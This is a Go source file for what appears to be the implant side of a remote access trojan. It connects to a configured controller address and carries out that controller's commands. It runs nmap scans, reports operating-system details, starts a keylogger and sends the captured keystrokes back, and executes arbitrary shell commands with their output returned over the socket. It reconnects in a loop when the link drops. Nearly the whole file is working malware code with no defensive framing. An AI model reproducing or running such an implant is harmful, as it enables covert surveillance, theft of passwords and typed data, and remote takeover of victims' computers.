package main

import (
	"encoding/json"
	"fmt"
	"io"
	"kunpeng/config"
	"kunpeng/hackpackage"
	"kunpeng/keylogger"
	"kunpeng/nmap"
	"log"
	"net"
	"os"
)

type SocketInfo struct {
	ResultCode int
	ResultMsg  string
}

func main() {
	//conn, err := net.Dial("tcp", "127.0.0.1:9999")
	//	//
	//	//// If don't exist a connection created than try connect to a new
	//	//if err != nil {
	//	//	log.Println("[*] Connecting...")
	//	//}
	//	//checkError(err)
	//	//_, err = conn.Write([]byte("wdnmd"))
	//	//checkError(err)
	//	//buf := make([]byte, 10)
	//	//for {
	//	//	_, err = conn.Read(buf)
	//	//	if err == io.EOF {
	//	//		conn.Close()
	//	//	}
	//	//	fmt.Print(string(buf))
	//	//}

	Connect()

}

func Connect() {

	conn, err := net.Dial("tcp", config.IP)

	if err != nil {
		log.Println("[*] Connecting...")
		for {
			Connect()
		}
	}

	SendMesg(conn, "jchaos is online!")
	print("连接上了")
	for {
		// When the command received aren't encoded,
		// skip switch, and be executed on OS shell.
		decodedCommand := ReadMesg(conn)
		socketinfocommand := SocketInfo{}
		json.Unmarshal([]byte(decodedCommand), &socketinfocommand)
		print(socketinfocommand.ResultMsg + "\n")
		print(socketinfocommand.ResultCode)
		print("\n")
		print(decodedCommand)
		print("\n")
		switch socketinfocommand.ResultCode {
		case config.Request_Code_Nmap:
			print("execute nmap")
			nmap.ExecNmap()
			//go service.GetNmapInfoFromIp("10.59.13.137")
		//SendMesg(conn, "run nmap")
		case config.Request_Code_GetNmapInfo:
			nmap.ExecNmap()
			var msg SocketInfo
			nmapInfos, _ := json.Marshal(nmap.NmapInfos)
			msg.ResultCode = config.Result_Code_NmapInfoList
			msg.ResultMsg = string(nmapInfos)

			print(msg.ResultMsg)
			print(msg.ResultCode)
			jsonstring, _ := json.Marshal(msg)
			print(string(jsonstring))
			SendMesg(conn, string(jsonstring))
			print("get NmapInfos")

		case config.Request_Code_GetRunGetOs:
			var msg SocketInfo
			msg.ResultCode = config.Result_Code_ReturnOsInfo
			msg.ResultMsg = hackpackage.GetOSInformation()
			print(msg.ResultMsg)
			print(msg.ResultCode)
			jsonstring, _ := json.Marshal(msg)
			print(string(jsonstring))
			SendMesg(conn, string(jsonstring))
		case config.Request_Code_KeyLogger_Start:
			print("you into keylogger_start")
			if !keylogger.StartKeyLogger() {
				var msg SocketInfo
				msg.ResultCode = config.Result_Code_HasStartLogger
				msg.ResultMsg = "keylogger has running!"
				print("stepone :keylogger has running!")
				jsonstring, _ := json.Marshal(msg)
				print(string(jsonstring))
				SendMesg(conn, string(jsonstring))
			} else {
				var msg SocketInfo
				msg.ResultCode = config.Result_Code_StartKeyLogger
				msg.ResultMsg = "run keylogger"
				print("run keylooger")
				jsonstring, _ := json.Marshal(msg)
				print(string(jsonstring))
				SendMesg(conn, string(jsonstring))
			}
		case config.Request_Code_KeyLogger_Show:
			if !keylogger.EndKeyLogger() {
				var msg SocketInfo
				msg.ResultCode = config.Result_Code_KeyLoggerNotOpen
				msg.ResultMsg = "keylogger didn't open"
				print("steptwo:keylogger didn't open")
				jsonstring, _ := json.Marshal(msg)
				print(string(jsonstring))
				SendMesg(conn, string(jsonstring))
			} else {
				var msg SocketInfo
				msg.ResultCode = config.Result_Code_ReturnKeyLogger
				msg.ResultMsg = keylogger.GetKeyRecording()
				jsonstring, _ := json.Marshal(msg)
				print(string(jsonstring))
				SendMesg(conn, string(jsonstring))
			}
		case config.Request_Code_RunCmd:
			print("cmd:" + socketinfocommand.ResultMsg)
			print("\n")
			result := hackpackage.ExecCmd(socketinfocommand.ResultMsg)
			var msg SocketInfo
			msg.ResultCode = config.Request_Code_Result_Code_Cmd
			msg.ResultMsg = string(result)
			jsonstring, _ := json.Marshal(msg)
			print(string(jsonstring))
			SendMesg(conn, string(jsonstring))

		} // end switch

		/**
		  重连模块
		*/

		SendMesg(conn, "")
		_, err := conn.Read(make([]byte, 0))

		/**
		链接出错，进行重新连接，并且初始化程序
		*/
		if err != nil {

			Connect()
		}

	}
}

func SendMesg(conn net.Conn, message string) {
	conn.Write([]byte(message))
}

func ReadMesg(conn net.Conn) string {
	buf := make([]byte, 1024)
	lens, err := conn.Read(buf)
	if err == io.EOF {
		conn.Close()
	}
	Command := string(buf[:lens])
	return Command
}

func checkError(err error) {
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
